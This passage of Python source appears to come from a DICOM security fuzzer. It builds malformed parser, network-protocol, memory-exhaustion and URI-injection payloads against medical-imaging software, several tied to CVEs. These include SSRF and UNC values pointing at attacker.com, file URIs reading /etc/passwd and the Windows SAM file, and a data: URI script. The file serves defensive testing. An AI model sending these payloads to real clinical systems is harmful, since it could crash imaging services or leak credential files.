        """Sequence Delimitation Item inside a defined-length sequence.

        PS3.5 7.5 uses a delimiter only when the length is undefined. Here the
        sequence declares its length *and* carries a delimiter, so a parser
        that stops at whichever it sees first will disagree with one that
        honors the other about where the sequence ends.
        """
        item_body = struct.pack('<HH2sH', 0x0008, 0x0060, b'CS', 2) + b'OT'
        item = struct.pack('<HHI', 0xFFFE, 0xE000, len(item_body)) + item_body
        delimiter = struct.pack('<HHI', 0xFFFE, 0xE0DD, 0)
        trailing = struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 8) + b'Doe^John'
        sq_body = item + delimiter + trailing
        payload = struct.pack('<HH2sHI', 0x0040, 0xA730, b'SQ', 0, len(sq_body)) + sq_body
        return AttackResult(
            name='sequence_delimiter_in_defined_length',
            category='parser',
            payload=payload,
            description='Defined-length sequence also carries a Sequence '
                        'Delimitation Item, so its end is ambiguous',
            expected_behavior='Parser should honor the defined length '
                              'consistently and not resume outside the sequence',
            metadata={
                'target_field': '(0040,A730) Content Sequence',
                'bug_class': 'sequence-boundary-ambiguity',
                'coverage_scope': 'sequence-delimitation',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def private_creator_block_collision() -> AttackResult:
        """Two private creators claiming the same reserved block.

        PS3.5 7.8.1 gives each creator an exclusive block of 256 elements.
        Two creators reserving 0x0010 means the elements in that block belong
        to whichever the parser bound last, so a private element can be
        attributed to the wrong vendor's handler.
        """
        payload = b''
        payload += struct.pack('<HH2sH', 0x0009, 0x0010, b'LO', 8) + b'VENDOR_A'
        payload += struct.pack('<HH2sH', 0x0009, 0x0010, b'LO', 8) + b'VENDOR_B'
        payload += struct.pack('<HH2sH', 0x0009, 0x1001, b'OB', 4) + b'\xde\xad\xbe\xef'
        return AttackResult(
            name='private_creator_block_collision',
            category='parser',
            payload=payload,
            description='Two private creators reserve block 0x0010 of group '
                        '0x0009; one private element then follows',
            expected_behavior='Parser should reject the duplicate reservation '
                              'rather than silently rebind the block',
            metadata={
                'target_field': '(0009,0010) Private Creator',
                'bug_class': 'private-block-rebinding',
                'coverage_scope': 'private-creator-reservation',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every parser attack payload."""
        yield cls.invalid_vr()
        yield cls.length_overflow()
        yield cls.length_underflow()
        yield cls.undefined_length_abuse()
        yield cls.sequence_bomb()
        yield cls.tag_out_of_order()
        yield cls.duplicate_tag()
        yield cls.null_in_string()
        yield cls.format_string_injection()
        yield cls.path_traversal_in_string()
        yield cls.unicode_expansion()
        yield cls.sequence_depth_bomb()
        yield cls.explicit_vr_in_implicit_dataset()
        yield cls.byte_swapped_lengths()
        yield cls.group_length_mismatch()
        yield cls.odd_length_values()
        yield cls.sequence_delimiter_in_defined_length()
        yield cls.private_creator_block_collision()


# =============================================================================
# Protocol Attacks - Target DICOM network stack
# =============================================================================

class ProtocolAttacks:
    """
    Attacks targeting DICOM network protocol.

    Uses Scapy packets for full protocol control when available.
    All methods return AttackResult for a uniform interface.
    """

    @staticmethod
    def malformed_protocol_version(version: int = 0xFFFF) -> AttackResult:
        """A-ASSOCIATE-RQ with invalid protocol version."""
        pkt = DICOM() / A_ASSOCIATE_RQ(
            protocol_version=version,
            called_ae_title='TARGET',
            calling_ae_title='ATTACKER',
        )
        payload = raw(pkt)
        return AttackResult(
            name='malformed_protocol_version',
            category='protocol',
            payload=payload,
            description=f'A-ASSOCIATE-RQ with protocol version {version:#x}',
            expected_behavior='Target should reject invalid version',
            metadata={'version': version},
        )

    @staticmethod
    def oversized_pdu(size: int = 0x100000) -> AttackResult:
        """PDU with declared length far exceeding data."""
        header = struct.pack('!BBL', 0x01, 0x00, size)
        body = b'X' * 100
        payload = header + body
        return AttackResult(
            name='oversized_pdu',
            category='protocol',
            payload=payload,
            description=f'PDU declares {size:#x} bytes, only 100 present',
            expected_behavior='Target should detect length mismatch',
            metadata={'declared_size': size,
                      'bug_class': 'pdu-length-overdeclared'},
        )

    @staticmethod
    def undersized_pdu() -> AttackResult:
        """PDU with declared length smaller than data."""
        header = struct.pack('!BBL', 0x01, 0x00, 10)
        body = b'X' * 1000
        payload = header + body
        return AttackResult(
            name='undersized_pdu',
            category='protocol',
            payload=payload,
            description='PDU declares 10 bytes, 1000 present',
            expected_behavior='Target should detect length mismatch',
            metadata={
                'coverage_scope': 'pdu-length-handling',
                'bug_class': 'length-vs-content-mismatch',
                'declared_length': 10, 'actual_length': 1000,
            },
        )

    @staticmethod
    def invalid_pdu_type(pdu_type: int = 0xFF) -> AttackResult:
        """PDU with unknown type code."""
        payload = struct.pack('!BBL', pdu_type, 0x00, 4) + b'\x00' * 4
        return AttackResult(
            name='invalid_pdu_type',
            category='protocol',
            payload=payload,
            description=f'PDU with unknown type {pdu_type:#x}',
            expected_behavior='Target should reject unknown PDU type',
            metadata={'pdu_type': pdu_type},
        )

    @staticmethod
    def truncated_association() -> AttackResult:
        """A-ASSOCIATE-RQ truncated mid-packet."""
        pkt = DICOM() / A_ASSOCIATE_RQ()
        full = raw(pkt)
        payload = full[:len(full) // 2]
        return AttackResult(
            name='truncated_association',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ truncated mid-packet',
            expected_behavior='Target should handle incomplete PDU',
            metadata={
                'coverage_scope': 'pdu-truncation',
                'bug_class': 'short-read',
            },
        )

    @staticmethod
    def pdata_without_association() -> AttackResult:
        """P-DATA-TF sent without prior association."""
        cmd = C_ECHO_RQ(message_id=1)
        pdv = PresentationDataValueItem(
            context_id=1,
            is_last=1, is_command=1,
            data=raw(cmd),
        )
        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
        payload = raw(pkt)
        return AttackResult(
            name='pdata_without_association',
            category='protocol',
            payload=payload,
            description='P-DATA-TF without prior association',
            expected_behavior='Target should abort or ignore',
            metadata={
                'coverage_scope': 'association-state',
                'bug_class': 'unassociated-data',
            },
        )

    @staticmethod
    def double_association() -> AttackResult:
        """Two A-ASSOCIATE-RQ packets (second should fail)."""
        pkt = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title='TARGET',
            calling_ae_title='ATTACKER',
        )
        pdu1, pdu2 = raw(pkt), raw(pkt)
        return AttackResult(
            name='double_association',
            category='protocol',
            payload=pdu1 + pdu2,
            description='Two A-ASSOCIATE-RQ packets (second should fail)',
            expected_behavior='Target should reject second association',
            metadata={'steps': [pdu1, pdu2]},
        )

    @staticmethod
    def overlong_ae_title() -> AttackResult:
        """A-ASSOCIATE-RQ with AE title > 16 chars."""
        pkt = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=b'X' * 20,  # Should be max 16
            calling_ae_title='ATTACKER',
        )
        payload = raw(pkt)
        return AttackResult(
            name='overlong_ae_title',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ with AE title > 16 chars',
            expected_behavior='Target should reject overlong AE title',
            metadata={
                'coverage_scope': 'ae-title-handling',
                'bug_class': 'fixed-field-overflow',
                'target_field': 'Called AE Title',
            },
        )

    @staticmethod
    def null_ae_titles() -> AttackResult:
        """A-ASSOCIATE-RQ with null AE titles."""
        pkt = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=b'\x00' * 16,
            calling_ae_title=b'\x00' * 16,
        )
        payload = raw(pkt)
        return AttackResult(
            name='null_ae_titles',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ with null AE titles',
            expected_behavior='Target should reject null AE titles',
            metadata={
                'coverage_scope': 'ae-title-handling',
                'bug_class': 'empty-identity',
                'target_field': 'Called/Calling AE Title',
            },
        )

    @staticmethod
    def missing_application_context() -> AttackResult:
        """A-ASSOCIATE-RQ without Application Context item."""
        variable_items = [
            build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
            build_user_information(max_pdu_length=16384),
        ]
        pkt = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title='TARGET',
            calling_ae_title='ATTACKER',
            variable_items=variable_items,
        )
        payload = raw(pkt)
        return AttackResult(
            name='missing_application_context',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ without Application Context',
            expected_behavior='Target should reject missing context',
            metadata={
                'coverage_scope': 'association-variable-items',
                'bug_class': 'missing-mandatory-item',
            },
        )

    @staticmethod
    def duplicate_presentation_context_id() -> AttackResult:
        """A-ASSOCIATE-RQ with two Presentation Contexts using the same ID."""
        variable_items = raw_item(0x10, b'1.2.840.10008.3.1.1.1')
        variable_items += raw_presentation_context(
            CT_IMAGE_STORAGE_SOP_CLASS_UID, context_id=1)
        variable_items += raw_presentation_context(
            MR_IMAGE_STORAGE_SOP_CLASS_UID, context_id=1)
        variable_items += raw_user_information()
        payload = raw_associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
        return AttackResult(
            name='duplicate_presentation_context_id',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ reuses Presentation Context ID 1 for two SOP classes',
            expected_behavior='Target should reject duplicate presentation context IDs',
            metadata={'coverage_scope': 'association-presentation-context-id'},
        )

    @staticmethod
    def even_presentation_context_id() -> AttackResult:
        """A-ASSOCIATE-RQ with even Presentation Context ID."""
        payload = raw_associate_rq(
            'STORESCP', 'C-SCARE-FZ', CT_IMAGE_STORAGE_SOP_CLASS_UID,
            context_id=2)
        return AttackResult(
            name='even_presentation_context_id',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ uses even Presentation Context ID 2',
            expected_behavior='Target should reject non-odd presentation context IDs',
            metadata={'coverage_scope': 'association-presentation-context-id'},
        )

    @staticmethod
    def presentation_context_without_transfer_syntax() -> AttackResult:
        """A-ASSOCIATE-RQ with Abstract Syntax but no Transfer Syntax."""
        pc_payload = bytes([1, 0, 0, 0])
        pc_payload += raw_item(0x30, CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii'))
        variable_items = raw_item(0x10, b'1.2.840.10008.3.1.1.1')
        variable_items += raw_item(0x20, pc_payload)
        variable_items += raw_user_information()
        payload = raw_associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
        return AttackResult(
            name='presentation_context_without_transfer_syntax',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ Storage context has no Transfer Syntax item',
            expected_behavior='Target should reject incomplete presentation context',
            metadata={'coverage_scope': 'association-presentation-context-items'},
        )

    @staticmethod
    def tiny_max_pdu_length() -> AttackResult:
        """A-ASSOCIATE-RQ negotiates an impractically tiny Max PDU Length."""
        user_info = raw_item(0x51, struct.pack('!I', 1))
        payload = raw_associate_rq(
            'STORESCP', 'C-SCARE-FZ', CT_IMAGE_STORAGE_SOP_CLASS_UID,
            user_info_payload=user_info)
        return AttackResult(
            name='tiny_max_pdu_length',
            category='protocol',
            payload=payload,
            description='A-ASSOCIATE-RQ offers Maximum Length of one byte',
            expected_behavior='Target should reject or safely clamp tiny Max PDU Length',
            metadata={'coverage_scope': 'association-user-information'},
        )

    @staticmethod
    def pdu_length_mismatch(inflate_by: int = 10000) -> AttackResult:
        """A-ASSOCIATE-RQ with length field inflated."""
        pkt = DICOM() / A_ASSOCIATE_RQ()
        pdu = raw(pkt)

        actual_len = struct.unpack('!I', pdu[2:6])[0]
        payload = pdu[:2] + struct.pack('!I', actual_len + inflate_by) + pdu[6:]
        return AttackResult(
            name='pdu_length_mismatch',
            category='protocol',
            payload=payload,
            description=f'PDU length inflated by {inflate_by}',
            expected_behavior='Target should detect length mismatch',
            metadata={'inflate_by': inflate_by,
                      'bug_class': 'pdu-length-overdeclared'},
        )

    @staticmethod
    def abort_injection() -> AttackResult:
        """A-ABORT packet for injecting mid-session."""
        pkt = DICOM() / A_ABORT(source=0, reason_diag=0)
        payload = raw(pkt)
        return AttackResult(
            name='abort_injection',
            category='protocol',
            payload=payload,
            description='A-ABORT packet for mid-session injection',
            expected_behavior='Target should handle abort cleanly',
            metadata={
                'coverage_scope': 'association-teardown',
                'bug_class': 'unsolicited-abort',
            },
        )

    @staticmethod
    def wrong_context_id(context_id: int = 255) -> AttackResult:
        """P-DATA-TF with non-negotiated context ID."""
        cmd = C_ECHO_RQ(message_id=1)
        pdv = PresentationDataValueItem(
            context_id=context_id,
            is_last=1, is_command=1,
            data=raw(cmd),
        )
        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
        payload = raw(pkt)
        return AttackResult(
            name='wrong_context_id',
            category='protocol',
            payload=payload,
            description=f'P-DATA-TF with context ID {context_id}',
            expected_behavior='Target should reject unknown context',
            metadata={'context_id': context_id},
        )

    @staticmethod
    def invalid_command_field() -> AttackResult:
        """DIMSE command with invalid command field (0xDEAD).

        Black-box analogue of the invalid-DIMSE-message segfault class:
        CVE-2024-34509 (dcmdata command-set parsing). The dcmnet sibling
        CVE-2024-34508 is covered by the AFLNet net campaign, which mutates
        full DIMSE sessions on the network-receive path.
        """
        cmd = C_STORE_RQ(
            affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
            affected_sop_instance_uid='1.2.3.4.5',
            message_id=1,
        )
        cmd.command_field = 0xDEAD  # Invalid!
        # A command set travels inside a P-DATA-TF PDV, the same as its
        # sibling pdata_without_association. Sent bare, the first byte of tag
        # (0000,0000) lands where the PDU type belongs, so the peer's DUL
        # rejects an unrecognised PDU and the command-set parser this payload
        # is aimed at never runs.
        pdv = PresentationDataValueItem(
            context_id=1, is_last=1, is_command=1, data=raw(cmd),
        )
        payload = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
        return AttackResult(
            name='invalid_command_field',
            category='protocol',
            payload=payload,
            description='DIMSE command with invalid field 0xDEAD',
            expected_behavior='Target should reject invalid command',
            metadata={'cve': 'CVE-2024-34509'},
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every protocol attack payload."""
        yield cls.malformed_protocol_version()
        yield cls.oversized_pdu()
        yield cls.undersized_pdu()
        yield cls.invalid_pdu_type()
        yield cls.truncated_association()
        yield cls.pdata_without_association()
        yield cls.double_association()
        yield cls.overlong_ae_title()
        yield cls.null_ae_titles()
        yield cls.missing_application_context()
        yield cls.duplicate_presentation_context_id()
        yield cls.even_presentation_context_id()
        yield cls.presentation_context_without_transfer_syntax()
        yield cls.tiny_max_pdu_length()
        yield cls.pdu_length_mismatch()
        yield cls.abort_injection()
        yield cls.wrong_context_id()
        yield cls.invalid_command_field()


# =============================================================================
# Memory Attacks - Buffer overflows, allocation exhaustion
# =============================================================================

class MemoryAttacks:
    """
    Attacks targeting memory handling vulnerabilities.
    
    CVE Coverage:
        CVE-2024-22100 - Heap-based buffer overflow
        CVE-2024-25578 - Out-of-bounds write
        CVE-2024-28877 - Stack-based buffer overflow
    """
    
    @staticmethod
    def pixel_dimension_overflow() -> AttackResult:
        """Rows/Columns set to cause integer overflow."""
        ds = Dataset()
        ds = ds / Element(0x0028, 0x0010, 'US', struct.pack('<H', 0xFFFF))  # Rows
        ds = ds / Element(0x0028, 0x0011, 'US', struct.pack('<H', 0xFFFF))  # Columns
        ds = ds / Element(0x0028, 0x0100, 'US', struct.pack('<H', 32))      # Bits Alloc
        ds = ds / Element(0x7FE0, 0x0010, 'OW', b'\x00' * 100)              # Small pixel data
        
        return AttackResult(
            name='pixel_dimension_overflow',
            category='memory',
            payload=ds.encode(),
            description='65535x65535 pixels with 32-bit allocation',
            expected_behavior='May cause integer overflow in size calc',
            metadata={'bug_class': 'integer-overflow', 'cve_related': 'CVE-2024-22100'}
        )
    
    @staticmethod
    def fragment_count_bomb() -> AttackResult:
        """Encapsulated pixel data with huge number of fragments."""
        pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')

        for i in range(10000):
            pixel.add_fragment(b'\xFF\xD8\xFF\xE0')

        # encode_element(), not encode(): the fragments have to be carried by a
        # (7FE0,0010) element with undefined length or the payload is a bare
        # item stream, which an SCP rejects as a malformed data set long before
        # it counts a single fragment.
        return AttackResult(
            name='fragment_count_bomb',
            category='memory',
            payload=pixel.encode_element(implicit_vr=True),
            description='10,000 pixel fragments',
            expected_behavior='May exhaust memory tracking fragments',
            metadata={
                'bug_class': 'resource-exhaustion',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
                'transfer_syntax': '1.2.840.10008.1.2.4.50',
            },
        )
    
    @staticmethod
    def offset_table_bomb() -> AttackResult:
        """Basic offset table with misleading offsets."""
        num_offsets = 1000
        offset_table = struct.pack('<I', num_offsets * 4)
        for i in range(num_offsets):
            offset_table += struct.pack('<I', (i * 0x10000000) & 0xFFFFFFFF)
        
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data tag
        data += b'OW'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item tag
        data += offset_table
        
        return AttackResult(
            name='offset_table_bomb',
            category='memory',
            payload=data,
            description=f'{num_offsets} fragment offsets pointing to huge addresses',
            expected_behavior='Parser may allocate or seek to huge addresses',
            metadata={'bug_class': 'oob-offset', 'cve_related': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def value_multiplicity_bomb() -> AttackResult:
        """Element with extreme value multiplicity."""
        value = '\\'.join(['X'] * 100000)
        ds = Dataset() / Element(0x0008, 0x0018, 'UI', value)
        
        return AttackResult(
            name='value_multiplicity_bomb',
            category='memory',
            payload=ds.encode(),
            description='SOP Instance UID with 100,000 values',
            expected_behavior='Parser may allocate huge string array',
            metadata={'bug_class': 'resource-exhaustion'}
        )
    
    @staticmethod
    def oversized_string_vr(size: int = 0x10000) -> AttackResult:
        """String VR exceeding normal limits."""
        ds = Dataset()
        ds = ds / Element(0x0010, 0x0010, 'PN', 'A' * size)  # Patient Name
        
        return AttackResult(
            name='oversized_string_vr',
            category='memory',
            payload=ds.encode(),
            description=f'Patient Name with {size} bytes',
            expected_behavior='Parser should handle or reject gracefully',
            metadata={'bug_class': 'oversized-value', 'size': size}
        )
    
    @staticmethod
    def maximum_length_field() -> AttackResult:
        """Element with 0xFFFFFFFF length."""
        ds = Dataset() / Element.raw(
            tag=0x00100010,
            vr='PN',
            length=0xFFFFFFFF,
            value=b'Test'
        )
        
        return AttackResult(
            name='maximum_length_field',
            category='memory',
            payload=ds.encode(),
            description='Element with maximum possible length declaration',
            expected_behavior='Parser should detect impossibility',
            metadata={'bug_class': 'length-overflow'}
        )
    
    @staticmethod
    def ob_vr_overflow() -> AttackResult:
        """OB (Other Byte) VR with data exceeding declared length."""
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data
        data += b'OB'
        data += b'\x00\x00'
        data += struct.pack('<I', 100)  # Declare 100 bytes
        data += b'X' * 10000  # But provide 10000
        
        return AttackResult(
            name='ob_vr_overflow',
            category='memory',
            payload=data,
            description='OB value exceeds declared length',
            expected_behavior='Parser should stop at declared length',
            metadata={'bug_class': 'length-mismatch', 'cve_related': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def ow_vr_overflow() -> AttackResult:
        """OW (Other Word) VR with excessive data."""
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data
        data += b'OW'
        data += b'\x00\x00'
        data += struct.pack('<I', 100)  # Declare 100 bytes
        data += b'\x00\xFF' * 5000  # 10000 bytes of 16-bit words
        
        return AttackResult(
            name='ow_vr_overflow',
            category='memory',
            payload=data,
            description='OW value exceeds declared length',
            expected_behavior='Parser should stop at declared length',
            metadata={'bug_class': 'length-mismatch', 'cve_related': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def lut_overflow() -> AttackResult:
        """Lookup Table data exceeding bounds."""
        ds = Dataset()
        # LUT Descriptor: entries, first value, bits stored
        ds = ds / Element(0x0028, 0x1101, 'US', struct.pack('<HHH', 256, 0, 16))
        # LUT Data - way more than 256 entries
        ds = ds / Element(0x0028, 0x1201, 'OW', b'\x00\x01' * 10000)
        
        return AttackResult(
            name='lut_overflow',
            category='memory',
            payload=ds.encode(),
            description='LUT data far exceeds descriptor count',
            expected_behavior='Parser should validate LUT size',
            metadata={'bug_class': 'lut-bounds', 'cve_related': 'CVE-2024-25578'}
        )
    
    @staticmethod
    def encapsulated_frame_overflow() -> AttackResult:
        """JPEG frame with invalid length markers."""
        # Fake JPEG with oversized APP0 marker
        fake_jpeg = b'\xFF\xD8'  # SOI
        fake_jpeg += b'\xFF\xE0'  # APP0
        fake_jpeg += struct.pack('>H', 0xFFFF)  # Maximum segment length
        fake_jpeg += b'JFIF\x00' + b'X' * 100  # Much less than declared
        fake_jpeg += b'\xFF\xD9'  # EOI
        
        pixel = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
        pixel.add_fragment(fake_jpeg)

        # The lie under test is the JPEG APP0 segment length, so the DICOM
        # framing around it has to be valid: wrapped in (7FE0,0010) with
        # undefined length, or the SCP stops at the data set and the JPEG
        # decoder — the actual target — is never invoked.
        return AttackResult(
            name='encapsulated_frame_overflow',
            category='memory',
            payload=pixel.encode_element(implicit_vr=True),
            description='JPEG with oversized segment length',
            expected_behavior='JPEG decoder should handle gracefully',
            metadata={
                'bug_class': 'codec-length',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
                'transfer_syntax': '1.2.840.10008.1.2.4.50',
            },
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every memory attack payload."""
        yield cls.pixel_dimension_overflow()
        yield cls.fragment_count_bomb()
        yield cls.offset_table_bomb()
        yield cls.value_multiplicity_bomb()
        yield cls.oversized_string_vr()
        yield cls.maximum_length_field()
        yield cls.ob_vr_overflow()
        yield cls.ow_vr_overflow()
        yield cls.lut_overflow()
        yield cls.encapsulated_frame_overflow()


# =============================================================================
# Logic Attacks - Semantic confusion, state violations
# =============================================================================

class LogicAttacks:
    """
    Attacks targeting DICOM semantic/logic layer.
    """
    
    @staticmethod
    def transfer_syntax_mismatch() -> AttackResult:
        """File declares one transfer syntax but uses another encoding.

        The mismatch is the attack, so the File Meta group around it is
        conformant — Type 1 elements and a correct (0002,0000) Group Length.
        Without them a reader stops at the header for a reason that has
        nothing to do with the encoding disagreement under test.
        """
        # Declares Explicit VR LE...
        meta = standard_file_meta(transfer_syntax=EXPLICIT_VR_LE_UID)

        # ...but encodes the Data Set as Implicit VR (tag + 4-byte length, no VR)
        data_implicit = struct.pack('<HH', 0x0010, 0x0010)
        data_implicit += struct.pack('<I', 8)
        data_implicit += b'Doe^John'

        file_data = part10_file(meta, dataset=data_implicit)

        return AttackResult(
            name='transfer_syntax_mismatch',
            category='logic',
            payload=file_data,
            description='Meta says Explicit VR, data is Implicit VR',
            expected_behavior='Parser should detect encoding mismatch',
            metadata={
                'coverage_scope': 'file-meta-vs-encoding',
                'bug_class': 'syntax-vs-encoding-mismatch',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )

    @staticmethod
    def negotiated_transfer_syntax_mismatch() -> AttackResult:
        """Dataset encoding contradicts the *negotiated* transfer syntax.

        The sibling above is a file-level mismatch: the Part-10 meta header
        declares one syntax and the data uses another, which a receiver can
        catch by reading its own header. This one moves the lie onto the
        association. The presentation context is negotiated as Implicit VR
        Little Endian, so the SCP commits to reading bare ``tag + 4-byte
        length`` elements — but the dataset that arrives is Explicit VR, where
        those same four bytes are a 2-byte VR followed by a 2-byte length.

        There is no meta header on the wire to cross-check against: PS3.5 §7.1
        makes the negotiated context the *only* authority on how to decode the
        C-STORE dataset. A receiver that sniffs the encoding instead of obeying
        the context takes a legacy, rarely exercised path; one that obeys it
        reads ``'OB'`` as a 32-bit length and derives an enormous element
        length from ASCII VR bytes. Either way this is the decode path that
        only ever runs against a peer that is lying.
        """
        ds = _injection_base_dataset()
        ds = ds / Element(0x0028, 0x0010, 'US', 4)               # Rows
        ds = ds / Element(0x0028, 0x0011, 'US', 4)               # Columns
        ds = ds / Element(0x0028, 0x0100, 'US', 8)               # Bits Allocated
        ds = ds / Element(0x7FE0, 0x0010, 'OB', b'\xAA' * 16)    # Pixel Data

        return AttackResult(
            name='negotiated_transfer_syntax_mismatch',
            category='logic',
            # Explicit VR bytes delivered on an Implicit VR context.
            payload=ds.encode(implicit_vr=False),
            description=('Dataset is Explicit VR LE but the presentation '
                         'context negotiates Implicit VR LE'),
            expected_behavior=('SCP should decode per the negotiated context '
                               'and reject the object, not sniff the encoding'),
            metadata={
                'coverage_scope': 'negotiated-syntax-enforcement',
                'bug_class': 'syntax-vs-encoding-mismatch',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
                # Pins what send_cstore negotiates; the payload above is
                # deliberately encoded the other way.
                'transfer_syntax': IMPLICIT_VR_LITTLE_ENDIAN_UID,
                'encoded_transfer_syntax': EXPLICIT_VR_LITTLE_ENDIAN_UID,
                'delivery_hint': 'cstore',
            },
        )

    @staticmethod
    def sop_class_mismatch() -> AttackResult:
        """SOP Class UID doesn't match actual content."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x0016, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
        # No actual CT-required elements
        
        return AttackResult(
            name='sop_class_mismatch',
            category='logic',
            payload=ds.encode(),
            description='Claims CT Image but missing CT elements',
            expected_behavior='Validator should reject',
            metadata={
                'coverage_scope': 'sop-class-enforcement',
                'bug_class': 'sop-class-confusion',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )
    
    @staticmethod
    def private_creator_missing() -> AttackResult:
        """Private tag without corresponding private creator."""
        ds = Dataset()
        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
        ds = ds / Element.raw(tag=0x00091001, vr='LO', value=b'PrivateData')
        
        return AttackResult(
            name='private_creator_missing',
            category='logic',
            payload=ds.encode(),
            description='Private tag (0009,1001) without (0009,0010) creator',
            expected_behavior='Parser may misinterpret VR',
            metadata={
                'coverage_scope': 'private-creator-reservation',
                'bug_class': 'unreserved-private-element',
                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                'sop_instance_uid': '1.2.3.4.5',
            },
        )
    
    @staticmethod
    def uri_ssrf(url: str = 'http://attacker.com/exfil') -> AttackResult:
        """
        URI injection for SSRF. CVE-2024-33606.
        
        DICOM supports URI-type Value Representations (VR=UR) that some
        viewers may follow without authorization checks.
        """
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', url)  # Retrieve URI
        
        return AttackResult(
            name='uri_ssrf',
            category='logic',
            payload=ds.encode(),
            description=f'URI tag pointing to {url}',
            expected_behavior='Viewer should not auto-fetch without auth',
            metadata={'cve': 'CVE-2024-33606', 'url': url}
        )
    
    @staticmethod
    def file_uri_injection() -> AttackResult:
        """file:// protocol injection. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', 'file:///etc/passwd')
        ds = ds / Element(0x0040, 0xE010, 'UR', 'file:///C:/Windows/System32/config/SAM')
        
        return AttackResult(
            name='file_uri_injection',
            category='logic',
            payload=ds.encode(),
            description='file:// URIs in UR tags',
            expected_behavior='Viewer should block file:// protocol',
            metadata={'cve': 'CVE-2024-33606'}
        )
    
    @staticmethod
    def unc_path_injection() -> AttackResult:
        """UNC path injection. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', '\\\\attacker.com\\share\\malware.exe')
        
        return AttackResult(
            name='unc_path_injection',
            category='logic',
            payload=ds.encode(),
            description='UNC path in URI tag',
            expected_behavior='Viewer should block UNC paths',
            metadata={'cve': 'CVE-2024-33606'}
        )
    
    @staticmethod
    def data_uri_script() -> AttackResult:
        """data: URI with script. CVE-2024-33606."""
        ds = Dataset()
        ds = ds / Element(0x0008, 0x1190, 'UR', 'data:text/html,<script>alert(1)</script>')
        
        return AttackResult(
            name='data_uri_script',
            category='logic',
            payload=ds.encode(),
            description='data: URI with script in UR tag',
            expected_behavior='Viewer should not execute data: URIs',
            metadata={'cve': 'CVE-2024-33606'}
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every logic attack payload."""
        yield cls.transfer_syntax_mismatch()
        yield cls.negotiated_transfer_syntax_mismatch()
        yield cls.sop_class_mismatch()
        yield cls.private_creator_missing()
        yield cls.uri_ssrf()
        yield cls.file_uri_injection()
        yield cls.unc_path_injection()
        yield cls.data_uri_script()


# =============================================================================
# Shared helpers for the storescp-filename injection catalogs
# (CommandInjectionAttacks / PathTraversalAttacks operate on the same small,
#  storable image object and the same ``(id, value, note)`` payload tables.)
# =============================================================================

def _injection_base_dataset() -> Dataset:
    """A small, storable image object carrying placeholder identifiers."""
    ds = Dataset()
    ds = ds / Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID)
    ds = ds / Element(0x0008, 0x0018, 'UI', '1.2.3.4.5')      # SOP Instance UID
    ds = ds / Element(0x0008, 0x0060, 'CS', 'OT')             # Modality
    ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')       # Patient Name
    ds = ds / Element(0x0010, 0x0020, 'LO', '12345')          # Patient ID
    ds = ds / Element(0x0020, 0x000D, 'UI', '1.2.3.4.5.1')    # Study Instance UID
    ds = ds / Element(0x0020, 0x000E, 'UI', '1.2.3.4.5.2')    # Series Instance UID
    return ds


